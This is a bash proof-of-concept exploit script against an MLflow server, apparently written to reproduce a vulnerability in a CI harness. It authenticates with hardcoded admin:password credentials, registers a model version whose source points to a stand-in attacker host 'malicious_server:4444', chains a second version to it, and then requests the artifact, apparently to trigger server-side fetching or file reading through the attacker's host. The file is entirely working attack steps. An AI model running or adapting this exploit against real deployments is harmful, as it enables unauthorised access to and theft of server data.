#!/bin/bash
IS_CI_RUN=$1
if [ "$IS_CI_RUN" == "true" ]; then
  BASE_URL="http://mlflow:5002"
else
  BASE_URL="http://127.0.0.1:5002"
fi

# Set MLflow authentication credentials
export MLFLOW_TRACKING_USERNAME=admin
export MLFLOW_TRACKING_PASSWORD=password

AUTH_HEADER="Authorization: Basic $(echo -n "admin:password" | base64)"

echo $BASE_URL/ajax-api/2.0/mlflow/registered-models/create

curl -X POST -H 'Content-Type: application/json' -H "$AUTH_HEADER" -d '{"name": "poc"}' "$BASE_URL/ajax-api/2.0/mlflow/registered-models/create"
curl -X POST -H 'Content-Type: application/json' -H "$AUTH_HEADER" -d '{"name": "poc", "source": "http://malicious_server:4444/api/2.0/mlflow-artifacts/artifacts/"}' "$BASE_URL/ajax-api/2.0/mlflow/model-versions/create"
curl -X POST -H 'Content-Type: application/json' -H "$AUTH_HEADER" -d '{"name": "poc", "source": "models:/poc/1"}' "$BASE_URL/ajax-api/2.0/mlflow/model-versions/create"
curl -H "$AUTH_HEADER" "$BASE_URL/model-versions/get-artifact?path=random&name=poc&version=2"